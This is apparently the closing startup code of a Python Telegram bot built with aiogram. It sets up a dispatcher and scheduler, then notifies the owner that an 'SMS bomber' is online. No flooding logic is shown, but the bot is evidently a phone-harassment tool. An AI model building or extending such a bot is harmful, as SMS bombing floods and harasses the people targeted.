    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)
    me = await bot.get_me()
    log.info(f"✅ @{me.username} started ({VERSION})")
    await start_scheduler(bot)
    try:
        await bot.send_message(OWNER_ID, f"🚀 {sc('ꜱᴍꜱ ʙᴏᴍʙᴇʀ')} {VERSION} {sc('ᴏɴʟɪɴᴇ')}\n@{me.username}\n\n📅 {sc('ꜱᴄʜᴇᴅᴜʟᴇʀ')}: ✅ {sc('ʀᴜɴɴɪɴɢ')}")
    except: pass
    try:
        await dp.start_polling(bot)
    finally:
        await stop_scheduler()

if __name__ == "__main__":
    asyncio.run(main())
